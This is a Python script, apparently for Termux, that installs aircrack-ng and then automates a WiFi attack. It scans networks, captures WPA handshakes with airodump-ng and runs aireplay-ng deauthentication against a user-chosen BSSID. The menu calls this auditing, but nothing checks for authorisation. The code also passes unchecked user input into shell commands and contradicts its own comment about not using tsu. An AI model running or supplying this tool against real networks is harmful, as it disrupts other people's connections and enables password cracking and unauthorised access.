import os
import subprocess

def instalar_dependencias():
    # Instalar dependencias necesarias sin usar tsu
    os.system('pkg update && pkg upgrade -y')
    os.system('pkg install root-repo -y')
    os.system('pkg install tsu -y')
    os.system('pkg install python -y')
    os.system('pkg install git -y')
    os.system('pkg install aircrack-ng -y')
    os.system('pip install scapy')

def escanear_redes():
    # Escanear redes WiFi disponibles
    try:
        resultado = subprocess.check_output(['tsu', '-c', 'iwlist wlan0 scan'], universal_newlines=True)
        redes = []
        for linea in resultado.split('\n'):
            if "ESSID" in linea:
                essid = linea.split(':')[1].strip().strip('"')
                redes.append(essid)
        return redes
    except subprocess.CalledProcessError as e:
        print(f"Error al escanear redes: {e}")
        return []
    except PermissionError as e:
        print(f"Permiso denegado al escanear redes: {e}")
        return []

def capturar_paquetes(bssid, channel):
    # Capturar paquetes de una red específica
    try:
        os.system(f'tsu -c "airodump-ng --bssid {bssid} -c {channel} -w handshake wlan0"')
    except Exception as e:
        print(f"Error al capturar paquetes: {e}")

def ataque_desautenticacion(bssid):
    # Realizar un ataque de desautenticación para capturar el handshake
    try:
        os.system(f'tsu -c "aireplay-ng --deauth 10 -a {bssid} wlan0"')
    except Exception as e:
        print(f"Error al realizar ataque de desautenticación: {e}")

if __name__ == "__main__":
    instalar_dependencias()
    redes = escanear_redes()
    if redes:
        print("Redes disponibles:")
        for i, red in enumerate(redes):
            print(f"{i + 1}. {red}")
        
        seleccion = int(input("Selecciona la red que deseas auditar (número): ")) - 1
        red_seleccionada = redes[seleccion]
        
        bssid = input(f"Introduce el BSSID de la red {red_seleccionada}: ")
        canal = input(f"Introduce el canal de la red {red_seleccionada}: ")
        
        capturar_paquetes(bssid, canal)
        ataque_desautenticacion(bssid)
    else:
        print("No se encontraron redes WiFi.")






